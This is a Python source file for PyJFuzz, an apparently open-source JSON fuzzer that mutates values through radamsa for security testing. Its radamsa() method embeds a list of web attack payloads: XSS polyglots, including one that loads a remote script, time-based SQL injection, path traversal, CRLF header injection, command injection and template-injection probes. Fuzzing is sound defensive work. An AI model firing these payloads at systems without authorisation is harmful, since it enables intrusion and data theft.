#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
PyJFuzz trivial python fuzzer based on radamsa.

MIT License

Copyright (c) 2016 Daniele Linguaglossa <danielelinguaglossa@gmail.com>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import subprocess
import json
import random
import string
import gc
import urllib
import sys
import argparse

__version__ = 0.1
__author__ = "Daniele 'dzonerzy' Linguaglossa"
__mail__ = "d.linguaglossa@mseclab.it"


class JSONFactory:
    fuzz_factor = None
    was_array = None
    is_fuzzed = None
    params = None
    strong_fuzz = False
    techniques = {
        "C": [10, 5],
        "H": [9],
        "P": [6, 2],
        "T": [11, 12],
        "R": [13],
        "S": [3, 1],
        "X": [0, 4, 7, 8]
    }
    tech = []

    def __init__(self, techniques=None, params=None, strong_fuzz=False):
        """
        Init the main class used to fuzz
        :param techniques: A string indicating the techniques that should be used while fuzzing (all if None)
        :param params: A list of parametrs to fuzz (all if None)
        :return: A class object
        """
        self.strong_fuzz = strong_fuzz
        self.params = params.split(",") if params is not None else params
        self.tech = list(techniques) if techniques is not None else []
        self.fuzz_factor = 0
        self.is_fuzzed = False
        self.was_array = False
        try:
            ver = subprocess.Popen(["radamsa", "-V"], stdout=subprocess.PIPE).communicate()[0]
            sys.stderr.write("[INFO] Using ({0})\n\n".format(ver.strip("\n")))
        except OSError:
            raise OSError("Radamsa was not found, Please install it!\n\n")

    def initWithJSON(self, json_obj):
        """
        Init the class with the base object, let's call this "test-case"
        :param json_obj: The object needed to initialize the fuzzing process, this is also the base object
        :return: None
        """
        fuzz_factor = self.fuzz_factor
        params = self.params
        tech = self.tech
        techniques = self.techniques
        strong_fuzz = self.strong_fuzz
        try:
            self.__dict__ = json.loads(json_obj)
        except TypeError:
            self.__dict__ = json.loads("{\"array\": %s}" % json_obj)
            self.was_array = True
        except ValueError:
            self.__dict__ = {"dummy": "dummy"}
        self.params = params
        self.fuzz_factor = fuzz_factor
        self.is_fuzzed = False
        self.techniques = techniques
        self.strong_fuzz = strong_fuzz
        if len(tech) != 0:
            for t in tech:
                if t in self.techniques.keys():
                    self.tech += self.techniques[t]
        self.__dict__.update({"tech": self.tech})

    def ffactor(self, factor):
        """
        Set the fuzz_factor variable to instruct the fuzzer "how much" to fuzz
        :param factor: fuzz_factor value
        :return: None
        """
        if factor not in range(0, 7):
            raise ValueError("Factor must be between 0-6")
        self.fuzz_factor = factor

    @staticmethod
    def _json_dumps(json_object, indent=0):
        """
        Return the fuzzed object and replace each non-printable character using unicode escape
        :param json_object: the fuzzed object
        :param indent: indent if needed
        :return: fuzzed object with escaped values
        """
        replacements = {
            "\\\\u": "\\u",
        }
        if bool(indent):
            json_object = json.dumps(json_object, indent=indent)
        else:
            json_object = json.dumps(json_object, separators=(',', ':'))
        for replacement in replacements:
            json_object = json_object.replace(replacement, replacements[replacement])
        return json_object

    def fuzz(self, indent=0):
        """
        Fuzz the object inserted by initWithJSON
        :param indent: indent if needed
        :return: String representing the fuzzed object
        """
        if self.strong_fuzz:
            return self.fuzz_elements(self.__dict__, self.fuzz_factor)
        return self._json_dumps(self.fuzz_elements(self.__dict__, self.fuzz_factor), indent=indent)

    def fuzz_elements(self, elements, factor):
        """
        Fuzz every element specified by elements and self.params (all if None)
        :param elements: the main base object, self.__dict__ by default
        :param factor: the fuzz_factor variable used while fuzzing
        :return: return a object representing the fuzzed JSON object
        """
        if self.is_fuzzed:
            raise ValueError("You cannot fuzz an already fuzzed object please call 'initWithJSON'")
        if self.strong_fuzz:
            result = dict(self.__dict__)
            del result["fuzz_factor"]
            del result["is_fuzzed"]
            del result["params"]
            del result["techniques"]
            del result["tech"]
            del result["strong_fuzz"]
            if self.was_array:
                return self._radamsa(json.dumps(result["array"]))
            return self._radamsa(json.dumps(result))
        else:
            for element in elements.keys():
                if element in ["fuzz_factor", "was_array", "is_fuzzed", "params", "techniques", "tech"]:
                    pass
                else:
                    if self.params is not None and element not in self.params:
                        pass
                    else:
                        if type(elements[element]) == dict:
                            self.fuzz_elements(elements[element], factor)
                        elif type(elements[element]) == list:
                            elements[element] = self.fuzz_array(elements[element], factor)
                        elif type(elements[element]) == int:
                            elements[element] = self.fuzz_int(elements[element], factor)
                        elif type(elements[element]) == bool:
                            elements[element] = self.fuzz_bool(elements[element], factor)
                        elif type(elements[element]) == unicode:
                            elements[element] = self.fuzz_string(elements[element], factor)
                        elif type(elements[element]) == str:
                            elements[element] = self.fuzz_string(elements[element], factor)
                        elif elements[element] is None:
                            elements[element] = self.fuzz_null(elements[element], factor)
            result = dict(self.__dict__)
            del result["fuzz_factor"]
            del result["is_fuzzed"]
            del result["params"]
            del result["techniques"]
            del result["tech"]
            del result["strong_fuzz"]
            if self.was_array:
                del result["was_array"]
                return result["array"]
            self.is_fuzzed = True
            return result

    def fuzz_null(self, fuzz_null, factor):
        """
        Fuzz the null value
        :param fuzz_null: Original value (None by default)
        :param factor: The fuzz_factor
        :return: Fuzzed value
        """
        self.fuzz_factor = factor
        actions = {
            0: lambda x: float('nan'),
            1: lambda x: int(bool(x)),
            2: lambda x: bool(x),
            3: lambda x: float('+inf'),
            4: lambda x: {},
            5: lambda x: [int(bool(x))],
            6: lambda x: float('-inf')
        }
        return actions[random.randint(0, factor)](fuzz_null)

    def fuzz_array(self, arr, factor):
        """
        Fuzz a base array
        :param arr: original value
        :param factor: The fuzz_factor
        :return: Fuzzed array
        """
        self.fuzz_factor = factor
        tmp_arr = list(arr)
        for element in tmp_arr:
            if type(element) == str:
                arr[arr.index(element)] = self.fuzz_string(element, factor)
            if type(element) == unicode:
                arr[arr.index(element)] = self.fuzz_string(element, factor)
            elif type(element) == int:
                arr[arr.index(element)] = self.fuzz_int(element, factor)
            elif type(element) == bool:
                arr[arr.index(element)] = self.fuzz_bool(element, factor)
            elif element is None:
                arr[arr.index(element)] = self.fuzz_null(element, factor)
            elif type(element) == list:
                print element
                arr[arr.index(element)] = self.fuzz_array(element, factor)
            elif type(element) == dict:
                tmp_fuzz = JSONFactory(techniques=self.techniques, params=self.params)
                tmp_fuzz.initWithJSON(json.dumps(element))
                tmp_fuzz.ffactor(self.fuzz_factor)
                arr[arr.index(element)] = json.loads(tmp_fuzz.fuzz())
        return arr

    def fuzz_string(self, fuzz_string, factor):
        """
        Fuzz a base string
        :param fuzz_string: Original value
        :param factor: The fuzz_factor
        :return: A fuzzed string
        """
        self.fuzz_factor = factor
        actions = {
            0: lambda x: x[::-1],
            1: lambda x: self.radamsa(x),
            2: lambda x: "",
            3: lambda x: [x],
            4: lambda x: False,
            5: lambda x: {"param": self.radamsa(x)},
            6: lambda x: 0,
        }
        return actions[random.randint(0, factor)](fuzz_string)

    def fuzz_bool(self, boolean, factor):
        """
        Fuzz a base boolean
        :param boolean: Original value
        :param factor: The fuzz_factor
        :return: A fuzzed boolean
        """
        self.fuzz_factor = factor
        actions = {
            0: lambda x: not x,
            1: lambda x: str(x),
            2: lambda x: str(not x),
            3: lambda x: int(x),
            4: lambda x: int(not x),
            5: lambda x: float(x),
            6: lambda x: float(not x),
        }
        return actions[random.randint(0, factor)](boolean)

    def fuzz_int(self, num, factor):
        """
        Fuzz a base integer
        :param num: Original value
        :param factor: The fuzz_factor
        :return: A fuzzed integer
        """
        self.fuzz_factor = factor
        actions = {
            0: lambda x: x ^ 0xffffff,
            1: lambda x: -x,
            2: lambda x: x*x,
            3: lambda x: x | 0xff,
            4: lambda x: random.randint(-2147483647, 2147483647),
            5: lambda x: bool(x),
            6: lambda x: x | 0xff000000
        }
        return actions[random.randint(0, factor)](num)

    def _radamsa(self, to_fuzz):
        p1 = subprocess.Popen(['/bin/echo', to_fuzz], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["radamsa"], stdin=p1.stdout, stdout=subprocess.PIPE)
        output = p2.communicate()[0]
        p1.stdout.close()
        p2.stdout.close()
        del p1
        del p2
        return "".join(x if x not in string.printable.strip("\t\n\r\x0b\x0c") else x for x in output)

    def radamsa(self, to_fuzz):
        """
        Fuzz a base string using radamsa fuzzed
        :param to_fuzz: Original value
        :return: A fuzzed string
        """
        encoding = lambda x: "\\u00%02x;" % ord(x)

        attacks = {
            0: "jaVasCript:/*-/*\\u0060/*\\\\u0060/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/"
               "</scRipt/--!>\\u003csVg/<sVg/oNloAd=alert(\%s\)//>\\u003e",
            1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR"
               "(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)"
               "<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = %s",
            2: "/../../../../etc/%s",
            3: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/%s",
            4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
               "s.stack=Error().stack,s.src=(/,/+/%s.net/).slice(2),document.documentElement.appendChild(s))//'>",
            5: "%s&sleep 5&id'\\\"\\u00600&sleep 5&id\\u0060'",
            6: "..\\..\\..\\..\\%s.ini",
            7: "data:text/html,https://%s:a.it@www.\\it",
            8: "file:///proc/self/%s",
            9: "\\u000d\\u00a0BB: %s@mail.it\\u000d\\u000aLocation: www.google.it",
            10: "||cmd.exe&&id||%s",
            11: "${7*7}a{{%s}}b",
            12: "{{'%s'*7}}",
            13: "".join(string.printable.strip("\t\n\r\x0b\x0c")[random.randint(0, 93)]
                        for _ in range(0, random.randint(1, 30))).replace("%", "") + "%s"
        }
        if len(self.tech) == 0:
            attack = attacks[random.randint(0, 13)]
        else:
            attack = attacks[random.choice(self.tech)]
        to_fuzz = attack % to_fuzz
        p1 = subprocess.Popen(['/bin/echo', to_fuzz], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["radamsa"], stdin=p1.stdout, stdout=subprocess.PIPE)
        output = p2.communicate()[0]
        p1.stdout.close()
        p2.stdout.close()
        del p1
        del p2
        return "".join(encoding(x) if x not in string.printable.strip("\t\n\r\x0b\x0c") else x for x in output)

if __name__ == "__main__":
    sys.stderr.write("PyJFuzz v{0} - {1} - {2}\n".format(__version__, __author__, __mail__))
    parser = argparse.ArgumentParser(description='Trivial Python JSON Fuzzer (c) DZONERZY',
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-j', metavar='JSON', help='Original JSON serialized object', required=True)
    parser.add_argument('-p', metavar='PARAMS', help='Parameters comma separated', required=False, default=None)
    parser.add_argument('-t', metavar='TECHNIQUES', help='Techniques "CHPTRSX"\n\n'
                                                         'C - Command Execution\n'
                                                         'H - Header Injection\n'
                                                         'P - Path Traversal\n'
                                                         'T - Template Injection\n'
                                                         'R - Random Characters\n'
                                                         'S - SQL Injection\n'
                                                         'X - XSS\n\n', required=False, default=None)
    parser.add_argument('-f', metavar='FUZZ_FACTOR', help='Fuzz factor [0-6]', type=int, default=6, required=False)
    parser.add_argument('-i', metavar='INDENT', help='JSON indent number', type=int, default=0, required=False)
    parser.add_argument('-ue', action='store_true', help='URLEncode result', dest='ue', default=False, required=False)
    parser.add_argument('-s', action='store_true', help='Strong fuzz without maintaining structure', dest='s',
                        default=False, required=False)
    args = parser.parse_args()
    obj = JSONFactory(args.t, args.p, args.s)
    obj.initWithJSON(args.j)
    obj.ffactor(args.f)
    if args.ue:
        sys.stdout.write(urllib.quote(obj.fuzz()))
    else:
        if args.i == 0:
            sys.stdout.write(obj.fuzz())
        else:
            sys.stdout.write(obj.fuzz(args.i))
    gc.collect()
